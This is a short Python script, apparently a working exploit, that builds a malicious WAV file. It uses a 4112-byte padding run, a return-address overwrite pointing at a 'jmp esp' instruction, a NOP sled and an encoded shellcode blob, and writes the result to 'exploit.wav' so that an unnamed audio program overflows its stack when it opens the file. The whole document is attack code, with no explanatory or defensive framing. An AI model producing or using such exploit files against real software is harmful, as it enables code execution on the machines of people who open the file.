

#Address=00419D0b
#Disassembly = jmp esp

from struct import pack

def exploit():
    buf = b""
    buf += b"\xba\xfc\xcc\xa4\x16\xdb\xc8\xd9\x74\x24\xf4\x58\x33"
    buf += b"\xc9\xb1\x31\x31\x50\x12\x03\x50\x12\x83\x3c\xc8\x46"
    buf += b"\xe3\x40\x39\x04\x0c\xb8\xba\x69\x84\x5d\x8b\xa9\xf2"
    buf += b"\x16\xbc\x19\x70\x7a\x31\xd1\xd4\x6e\xc2\x97\xf0\x81"
    buf += b"\x63\x1d\x27\xac\x74\x0e\x1b\xaf\xf6\x4d\x48\x0f\xc6"
    buf += b"\x9d\x9d\x4e\x0f\xc3\x6c\x02\xd8\x8f\xc3\xb2\x6d\xc5"
    buf += b"\xdf\x39\x3d\xcb\x67\xde\xf6\xea\x46\x71\x8c\xb4\x48"
    buf += b"\x70\x41\xcd\xc0\x6a\x86\xe8\x9b\x01\x7c\x86\x1d\xc3"
    buf += b"\x4c\x67\xb1\x2a\x61\x9a\xcb\x6b\x46\x45\xbe\x85\xb4"
    buf += b"\xf8\xb9\x52\xc6\x26\x4f\x40\x60\xac\xf7\xac\x90\x61"
    buf += b"\x61\x27\x9e\xce\xe5\x6f\x83\xd1\x2a\x04\xbf\x5a\xcd"
    buf += b"\xca\x49\x18\xea\xce\x12\xfa\x93\x57\xff\xad\xac\x87"
    buf += b"\xa0\x12\x09\xcc\x4d\x46\x20\x8f\x1b\x99\xb6\xaa\x6e"
    buf += b"\x99\xc8\xb4\xde\xf2\xf9\x3f\xb1\x85\x05\xea\xf5\x7a"
    buf += b"\x4c\xb6\x5c\x13\x09\x23\xdd\x7e\xaa\x9e\x22\x87\x29"
    buf += b"\x2a\xdb\x7c\x31\x5f\xde\x39\xf5\x8c\x92\x52\x90\xb2"
    buf += b"\x01\x52\xb1\xd1\xc8\xc8\x14\x70\x6b\x74\x69"

    offset = 4112

    buffer = b"A"*offset

    eip = pack('<L', 0x00419d0b)

    nop = b"\x90" * 32

    payload = buffer + eip + nop + buf

    with open('exploit.wav', 'wb') as f:
        f.write(payload)

exploit()
